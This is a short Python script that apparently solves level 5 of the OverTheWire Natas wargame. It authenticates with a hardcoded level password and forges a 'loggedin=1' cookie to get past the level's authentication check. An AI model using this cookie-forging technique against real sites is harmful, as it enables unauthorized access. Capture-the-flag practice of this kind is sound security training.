#!/usr/bin/env python
import requests
username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'

session = requests.Session();
url = 'http://%s.natas.labs.overthewire.org/' % username
response = session.get(url, auth=(username, password),headers={'cookie':'loggedin=1'})

content = response.text
print(content)
